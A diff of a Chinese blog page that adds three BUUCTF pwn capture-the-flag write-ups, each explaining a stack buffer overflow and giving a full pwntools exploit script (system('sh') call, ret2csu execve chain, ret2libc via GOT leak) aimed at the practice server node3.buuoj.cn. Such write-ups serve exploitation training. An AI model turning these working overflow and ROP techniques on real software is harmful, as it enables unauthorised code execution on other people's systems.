@@ -101,8 +101,26 @@
 <meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20201105114754145.png">
 <meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20201105114914833.png">
 <meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20201105120131498.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20201105215357163.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20201105215428495.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20201106113658304.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20201106113741030.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20201106113901780.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20201106160828730.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20201106161721030.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20201106161814576.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20201106162215451.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20201106221342423.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20201106221705844.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20201106225441796.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20201106225608750.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20201107111533619.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20201107111556821.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20201107141506926.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20201107141740396.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20201107141800487.png">
 <meta property="article:published_time" content="2020-05-21T04:07:57.000Z">
-<meta property="article:modified_time" content="2020-11-05T13:50:50.691Z">
+<meta property="article:modified_time" content="2020-11-07T09:23:32.768Z">
 <meta property="article:author" content="River Li">
 <meta property="article:tag" content="hack">
 <meta property="article:tag" content="CTF">
@@ -307,7 +325,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-11-05 21:50:50" itemprop="dateModified" datetime="2020-11-05T21:50:50+08:00">2020-11-05</time>
+                <time title="修改时间：2020-11-07 17:23:32" itemprop="dateModified" datetime="2020-11-07T17:23:32+08:00">2020-11-07</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -775,6 +793,96 @@
 
 <p>但是拿到shell之后发现flag居然不在根目录，少见</p>
 <p><img src="image-20201105120131498.png" alt="image-20201105120131498"></p>
+<h2 id="ciscn-2019-ne-5"><a href="#ciscn-2019-ne-5" class="headerlink" title="ciscn_2019_ne_5"></a>ciscn_2019_ne_5</h2><p>首先检查安全机制</p>
+<p><img src="image-20201105215357163.png" alt="image-20201105215357163"></p>
+<p>开启了NX的32位程序</p>
+<p>运行后是一个输入password的地方</p>
+<p><img src="image-20201105215428495.png" alt="image-20201105215428495"></p>
+<p>反编译逆向看到</p>
+<p><img src="image-20201106113658304.png" alt="image-20201106113658304"></p>
+<p>输入administrator就可以过去，后面的程序是一个循环</p>
+<p>输出显示的只有4个选项，但是实际上看到switch中还有一个隐藏的选项</p>
+<p>AddLog这个选项通过scanf输入一个log，长度限制是128</p>
+<p><img src="image-20201106113741030.png" alt="image-20201106113741030"></p>
+<p>在GetFlag这个函数中有一个strcpy，但是这里的目标串dst距离ebp只有0x48</p>
+<p>因此有可能溢出</p>
+<p><img src="image-20201106113901780.png" alt="image-20201106113901780"></p>
+<p>在选项<code>Print</code>那里是用到了<code>system</code></p>
+<p>在程序中没有找到<code>/bin/sh</code></p>
+<p>但是存在<code>sh</code></p>
+<p>那么思路就是首先用第一个选项输入payload</p>
+<p>之后用选项4造成溢出并且调用<code>system(&quot;sh&quot;)</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28345</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./ciscn_2019_ne_5&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_2019_ne_5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;password:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;administrator&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;\n:&#x27;</span>)</span><br><span class="line">io.sendline(str(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">sh_addr = <span class="number">0x080482ea</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x48</span> + <span class="string">&#x27;b&#x27;</span>*<span class="number">0x4</span> + p32(elf.sym[<span class="string">&#x27;system&#x27;</span>]) +p32(elf.sym[<span class="string">&#x27;main&#x27;</span>])+ p32(sh_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(str(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a>ciscn_2019_s_3</h2><p>首先checksec</p>
+<p><img src="image-20201106160828730.png" alt="image-20201106160828730"></p>
+<p>开启了NX的64位程序</p>
+<p>这个程序比较奇怪，反编译了vuln函数之后可以看到</p>
+<p><img src="image-20201106161721030.png" alt="image-20201106161721030"></p>
+<p>是调用了一次read，一次write</p>
+<p>但这里没法直接看到具体调用的参数，用gdb跑起来看一下</p>
+<p>跑到read这里的时候的三个参数分别是</p>
+<p><img src="image-20201106161814576.png" alt="image-20201106161814576"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read(<span class="number">0</span>,buf,<span class="number">0x400</span>);</span><br></pre></td></tr></table></figure>
+
+<p>也就是说从stdin读了最多0x400到栈上</p>
+<p>之后又调用了write函数，执行到这里的时候各个参数为</p>
+<p><img src="image-20201106162215451.png" alt="image-20201106162215451"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">write(<span class="number">1</span>,buf,<span class="number">0x30</span>);</span><br></pre></td></tr></table></figure>
+
+<p>也就是说从栈上的buf将0x30长度的内容写到stdout上</p>
+<p>但是这个vuln函数向下执行的时候就没办法正常的返回了，因为栈上已经都是’a’了</p>
+<p>计算一下偏移，81-65=16</p>
+<p>由于开启了NX，这个明显要用ROP了</p>
+<p>由于是64位的程序，很可能是ret2csu</p>
+<p>另外程序还给了一个gadget的函数，里面存在几个可以用到的gadget</p>
+<p><img src="image-20201106221342423.png" alt="image-20201106221342423"></p>
+<p>这一个函数中给到了三个gadget</p>
+<p>这里给出的一个<code>mov rax,3Bh; retn</code></p>
+<p>之后可以尝试去调用<code>syscall</code>，因为<code>3Bh</code>对应的59在系统调用号中正好是<code>execve</code></p>
+<p><img src="image-20201106221705844.png" alt="image-20201106221705844"></p>
+<p>全部的系统调用号对应表：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/tcctw/p/11450449.html">https://www.cnblogs.com/tcctw/p/11450449.html</a></p>
+<p>如果我们想要执行<code>execve(&quot;/bin/sh&quot;)</code>，那么就需要在栈中存储这个字符串，之后将这个字符串的地址赋给rdi，最后调用execve</p>
+<p>在执行到write的那个syscall时，栈中rsi指向了栈中的buffer</p>
+<p><img src="image-20201106225441796.png" alt="image-20201106225441796"></p>
+<p>由于这里输出的是0x30的内容，此时栈顶是从上面字符串c开始的位置</p>
+<p><img src="image-20201106225608750.png" alt="image-20201106225608750"></p>
+<p>因此输出0x30的内容的话，会将栈中另外两个内容输出出来，这其中恰好有一个是指向栈上的地址</p>
+<p>在上面的图中就是<code>0x00007fffffffde38</code>以及另外一个<code>0x0000000100000000</code></p>
+<p>这个<code>de38</code>距离我们字符串的开头<code>dd20</code>相差了<code>0x118</code></p>
+<p>我们就可以用得到的这个值进行定位</p>
+<p>至于调用execve的过程，首先将rax设置为execve的调用号</p>
+<p>之后ret回来之后设置一下几个寄存器中的值</p>
+<p>需要注意的是，execve函数在调用时，实际上需要三个参数，最开始尝试直接运行<code>execve(&#39;/bin/sh&#39;)</code>失败了，网上查了说后面两个参数需要为0，也就是说在运行时我们需要令<code>rdi=*&quot;/bin/sh&quot;</code>, <code>rsi=0</code>, <code>rdx=0</code></p>
+<p>但是在gadget中搜索没有找到为rdx赋值的gadget</p>
+<p>我们就只能是用到ret2csu来控制rdx的值了</p>
+<p>首先执行<code>__libc_start_main</code>中的后面一部分pop</p>
+<p><img src="image-20201107111533619.png" alt="image-20201107111533619"></p>
+<p>之后执行前面那一块的mov</p>
+<p><img src="image-20201107111556821.png" alt="image-20201107111556821"></p>
+<p>这里我们的目的是给rdx赋值，所以需要控制r13</p>
+<p>由于我们设置rbx=0，实际上call的位置就是r12寄存器控制的，这里设置r12的值为栈上当前下一个地址，即pop_rdi的地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;/bin/sh\x00&#x27;</span>*<span class="number">2</span> + p64(rax_3b) </span><br><span class="line">payload += p64(csu_pop) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(r12) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(r15)</span><br><span class="line">payload += p64(csu_mov)</span><br><span class="line">payload += p64(pop_rdi) + p64(payload_addr) + p64(syscall_addr)</span><br></pre></td></tr></table></figure>
+
+<p>写的时候发现一个问题就是第一次payload回来的位置不对，这个程序经过了一次调用vuln，所以回来的地址应该是<code>elf.sym[&#39;vuln&#39;]</code>，之前写成<code>main</code>就错了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29878</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./ciscn_s_3&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_s_3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main = elf.sym[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line">syscall_addr = <span class="number">0x400517</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;/bin/sh\x00&#x27;</span>*<span class="number">2</span> + p64(main)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv(<span class="number">0x20</span>)</span><br><span class="line">payload_addr = u64(io.recv(<span class="number">0x8</span>)) - <span class="number">0x118</span></span><br><span class="line">print(<span class="string">&#x27;payload address is:&#x27;</span>,hex(payload_addr))</span><br><span class="line">io.recv(<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">rax_3b = <span class="number">0x4004e2</span></span><br><span class="line">pop_rdi = <span class="number">0x4005a3</span></span><br><span class="line"></span><br><span class="line">csu_pop = <span class="number">0x40059A</span></span><br><span class="line">csu_mov = <span class="number">0x400580</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;/bin/sh\x00&#x27;</span>*<span class="number">2</span> + p64(rax_3b)</span><br><span class="line">payload += p64(csu_pop) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(payload_addr + <span class="number">0x58</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(csu_mov)</span><br><span class="line">payload += p64(pop_rdi) + p64(payload_addr) + p64(syscall_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>这个题目还可以用SROP来做，之后有机会再写。</p>
+<h2 id="铁人三项-2018-rop"><a href="#铁人三项-2018-rop" class="headerlink" title="铁人三项_2018_rop"></a>铁人三项_2018_rop</h2><p>首先检查安全机制</p>
+<p><img src="image-20201107141506926.png" alt="image-20201107141506926"></p>
+<p>开启了NX的32位程序</p>
+<p>main函数反编译后发现里面按顺序调用了两个函数</p>
+<p><img src="image-20201107141740396.png" alt="image-20201107141740396"></p>
+<p>其中vulnerable_function存在溢出</p>
+<p><img src="image-20201107141800487.png" alt="image-20201107141800487"></p>
+<p>没有在程序中找到system、binsh这些</p>
+<p>所以就当作ret2libc来做</p>
+<p>首先用write输出write或read的got表中的真实地址，之后用LibcSearcher查libc的版本</p>
+<p>最后计算system、binsh的偏移拿shell</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27746</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;2018_rop&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./2018_rop&#x27;</span>)</span><br><span class="line">plt_write = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">got_write = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span> + <span class="string">&#x27;b&#x27;</span>*<span class="number">4</span> + p32(plt_write) + p32(elf.sym[<span class="string">&#x27;vulnerable_function&#x27;</span>]) + p32(<span class="number">1</span>) + p32(elf.got[<span class="string">&#x27;write&#x27;</span>]) + p32(<span class="number">4</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">write_real = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span> + <span class="string">&#x27;b&#x27;</span>*<span class="number">4</span> + p32(plt_write) + p32(elf.sym[<span class="string">&#x27;vulnerable_function&#x27;</span>]) + p32(<span class="number">1</span>) + p32(elf.got[<span class="string">&#x27;read&#x27;</span>]) + p32(<span class="number">4</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">read_real = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(address=read_real,func=<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line">libc.add_condition(address=write_real,func=<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_base = read_real - libc.dump(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span> + <span class="string">&#x27;b&#x27;</span>*<span class="number">4</span> + p32(system_addr) + p32(elf.sym[<span class="string">&#x27;vulnerable_function&#x27;</span>]) + p32(binsh_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
 
     </div>
 
@@ -860,7 +968,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#RIP"><span class="nav-number">1.</span> <span class="nav-text">RIP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#warmup-csaw-2016"><span class="nav-number">2.</span> <span class="nav-text">warmup_csaw_2016</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn1-sctf-2016"><span class="nav-number">3.</span> <span class="nav-text">pwn1_sctf_2016</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-2019-n-1"><span class="nav-number">4.</span> <span class="nav-text">ciscn_2019_n_1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-2019-c-1"><span class="nav-number">5.</span> <span class="nav-text">ciscn_2019_c_1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"><span class="nav-number">5.1.</span> <span class="nav-text">程序分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#payload%E7%BC%96%E5%86%99"><span class="nav-number">5.2.</span> <span class="nav-text">payload编写</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#babyrop"><span class="nav-number">6.</span> <span class="nav-text">babyrop</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E5%88%86%E6%9E%90"><span class="nav-number">6.1.</span> <span class="nav-text">基本分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BC%96%E5%86%99payload"><span class="nav-number">6.2.</span> <span class="nav-text">编写payload</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BA%A2%E5%87%BAsub-804871f"><span class="nav-number">6.2.1.</span> <span class="nav-text">溢出sub_804871f</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BA%A2%E5%87%BA%E5%BE%97%E5%88%B0write%E7%9C%9F%E5%AE%9E%E5%9C%B0%E5%9D%80"><span class="nav-number">6.2.2.</span> <span class="nav-text">溢出得到write真实地址</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BA%A2%E5%87%BA%E5%BE%97%E5%88%B0shell"><span class="nav-number">6.2.3.</span> <span class="nav-text">溢出得到shell</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-2019-en-2"><span class="nav-number">7.</span> <span class="nav-text">ciscn_2019_en_2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E5%88%86%E6%9E%90-1"><span class="nav-number">7.1.</span> <span class="nav-text">基本分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#get-started-3dsctf-2016"><span class="nav-number">8.</span> <span class="nav-text">get_started_3dsctf_2016</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E5%88%86%E6%9E%90-2"><span class="nav-number">8.1.</span> <span class="nav-text">基本分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%E5%86%B3%E8%B5%9BPWN5"><span class="nav-number">9.</span> <span class="nav-text">第五空间2019决赛PWN5</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-number">9.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8"><span class="nav-number">9.2.</span> <span class="nav-text">利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Jarvisoj-level0"><span class="nav-number">10.</span> <span class="nav-text">Jarvisoj_level0</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BJDCTF-2nd-r2t3"><span class="nav-number">11.</span> <span class="nav-text">[BJDCTF 2nd]r2t3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BJDCTF-2nd-one-gadget"><span class="nav-number">12.</span> <span class="nav-text">[BJDCTF 2nd]one gadget</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-2019-n-8"><span class="nav-number">13.</span> <span class="nav-text">ciscn_2019_n_8</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#not-the-same-3dsctf-2016"><span class="nav-number">14.</span> <span class="nav-text">not_the_same_3dsctf_2016</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#jarvisoj-level2"><span class="nav-number">15.</span> <span class="nav-text">jarvisoj_level2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BJDCTF-2020-babystack"><span class="nav-number">16.</span> <span class="nav-text">[BJDCTF_2020] babystack</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#jarvisoj-level2-x64"><span class="nav-number">17.</span> <span class="nav-text">jarvisoj_level2_x64</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-2019-n-5"><span class="nav-number">18.</span> <span class="nav-text">ciscn_2019_n_5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HarekazeCTF2019-babyrop"><span class="nav-number">19.</span> <span class="nav-text">HarekazeCTF2019_babyrop</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#RIP"><span class="nav-number">1.</span> <span class="nav-text">RIP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#warmup-csaw-2016"><span class="nav-number">2.</span> <span class="nav-text">warmup_csaw_2016</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn1-sctf-2016"><span class="nav-number">3.</span> <span class="nav-text">pwn1_sctf_2016</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-2019-n-1"><span class="nav-number">4.</span> <span class="nav-text">ciscn_2019_n_1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-2019-c-1"><span class="nav-number">5.</span> <span class="nav-text">ciscn_2019_c_1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"><span class="nav-number">5.1.</span> <span class="nav-text">程序分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#payload%E7%BC%96%E5%86%99"><span class="nav-number">5.2.</span> <span class="nav-text">payload编写</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#babyrop"><span class="nav-number">6.</span> <span class="nav-text">babyrop</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E5%88%86%E6%9E%90"><span class="nav-number">6.1.</span> <span class="nav-text">基本分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BC%96%E5%86%99payload"><span class="nav-number">6.2.</span> <span class="nav-text">编写payload</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BA%A2%E5%87%BAsub-804871f"><span class="nav-number">6.2.1.</span> <span class="nav-text">溢出sub_804871f</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BA%A2%E5%87%BA%E5%BE%97%E5%88%B0write%E7%9C%9F%E5%AE%9E%E5%9C%B0%E5%9D%80"><span class="nav-number">6.2.2.</span> <span class="nav-text">溢出得到write真实地址</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BA%A2%E5%87%BA%E5%BE%97%E5%88%B0shell"><span class="nav-number">6.2.3.</span> <span class="nav-text">溢出得到shell</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-2019-en-2"><span class="nav-number">7.</span> <span class="nav-text">ciscn_2019_en_2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E5%88%86%E6%9E%90-1"><span class="nav-number">7.1.</span> <span class="nav-text">基本分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#get-started-3dsctf-2016"><span class="nav-number">8.</span> <span class="nav-text">get_started_3dsctf_2016</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E5%88%86%E6%9E%90-2"><span class="nav-number">8.1.</span> <span class="nav-text">基本分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%E5%86%B3%E8%B5%9BPWN5"><span class="nav-number">9.</span> <span class="nav-text">第五空间2019决赛PWN5</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-number">9.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8"><span class="nav-number">9.2.</span> <span class="nav-text">利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Jarvisoj-level0"><span class="nav-number">10.</span> <span class="nav-text">Jarvisoj_level0</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BJDCTF-2nd-r2t3"><span class="nav-number">11.</span> <span class="nav-text">[BJDCTF 2nd]r2t3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BJDCTF-2nd-one-gadget"><span class="nav-number">12.</span> <span class="nav-text">[BJDCTF 2nd]one gadget</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-2019-n-8"><span class="nav-number">13.</span> <span class="nav-text">ciscn_2019_n_8</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#not-the-same-3dsctf-2016"><span class="nav-number">14.</span> <span class="nav-text">not_the_same_3dsctf_2016</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#jarvisoj-level2"><span class="nav-number">15.</span> <span class="nav-text">jarvisoj_level2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BJDCTF-2020-babystack"><span class="nav-number">16.</span> <span class="nav-text">[BJDCTF_2020] babystack</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#jarvisoj-level2-x64"><span class="nav-number">17.</span> <span class="nav-text">jarvisoj_level2_x64</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-2019-n-5"><span class="nav-number">18.</span> <span class="nav-text">ciscn_2019_n_5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HarekazeCTF2019-babyrop"><span class="nav-number">19.</span> <span class="nav-text">HarekazeCTF2019_babyrop</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-2019-ne-5"><span class="nav-number">20.</span> <span class="nav-text">ciscn_2019_ne_5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-2019-s-3"><span class="nav-number">21.</span> <span class="nav-text">ciscn_2019_s_3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9-2018-rop"><span class="nav-number">22.</span> <span class="nav-text">铁人三项_2018_rop</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -876,14 +984,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">89</span>
+          <span class="site-state-item-count">91</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-count">12</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
